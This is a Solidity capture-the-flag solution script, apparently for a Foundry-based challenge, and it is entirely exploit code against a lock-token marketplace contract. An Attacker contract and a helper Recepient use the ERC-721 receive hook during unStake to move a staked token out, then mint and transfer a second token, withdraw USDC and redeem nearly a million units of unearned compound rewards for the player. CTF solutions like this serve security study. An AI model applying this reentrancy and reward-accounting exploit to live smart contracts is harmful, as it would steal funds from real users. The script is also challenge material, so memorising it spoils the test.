// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-ctf/CTFSolver.sol";

import "forge-std/console.sol";

import  "src/Challenge.sol";

contract Recepient {

    address public owner;
    Challenge public challenge;
    uint256 public tokenId;

    constructor(Challenge _challenge) {
        owner = msg.sender;
        challenge = _challenge;
        challenge.LOCK_TOKEN().setApprovalForAll(msg.sender, true);
    }

    function setTokenId(uint256 _tokenId) external {
        challenge.LOCK_TOKEN().approve(address(challenge.LOCK_MARKETPLACE()), _tokenId);
        tokenId = _tokenId;
    }


    function onERC721Received(address from, address to, uint256 _tokenId, bytes calldata) external returns (bytes4) {
        
        if(_tokenId == tokenId) {
            challenge.LOCK_TOKEN().transferFrom(address(this), address(challenge), tokenId);
        }

        return this.onERC721Received.selector;
    }

    function claimRewards(uint256 _tokenId) external {
        challenge.LOCK_MARKETPLACE().withdrawUSDC(_tokenId, 100e6);
        challenge.LOCK_MARKETPLACE().redeemCompoundRewards(_tokenId, 1_000_000e6 - 1);
        challenge.USDC().transfer(challenge.PLAYER(), challenge.USDC().balanceOf(address(this)));
    }
}


contract Attacker {

    Challenge public challenge;
    constructor(Challenge _challenge) {
        challenge = _challenge;
    }

    function attack() external {
        Recepient recepient = new Recepient(challenge);

        challenge.USDC().approve(address(challenge.LOCK_MARKETPLACE()), 1_000_520e6);
        uint256 tokenId = challenge.LOCK_MARKETPLACE().mintWithUSDC(address(recepient), 120e6);

        recepient.setTokenId(tokenId);

        challenge.LOCK_MARKETPLACE().stake(tokenId, 100e6);

        challenge.LOCK_MARKETPLACE().unStake(address(recepient), tokenId);


        tokenId = challenge.LOCK_MARKETPLACE().mintWithUSDC(address(this), 120e6);
        challenge.LOCK_TOKEN().transferFrom(address(this), address(recepient), tokenId);

        recepient.claimRewards(tokenId);
    }



    function onERC721Received(address from, address to, uint256 tokenId, bytes calldata) external returns (bytes4) {
        
        return this.onERC721Received.selector;
    }

}


contract SolutionScript is CTFSolver {
    function solve(address _challenge, address _player) virtual internal override {
        Challenge challenge = Challenge(_challenge);
        console.log("challenge player", challenge.PLAYER());
        console.log("player", _player);
        Attacker attacker = new Attacker(challenge);

        challenge.USDC().transfer(address(attacker), 250e6);

        attacker.attack();
    }
}
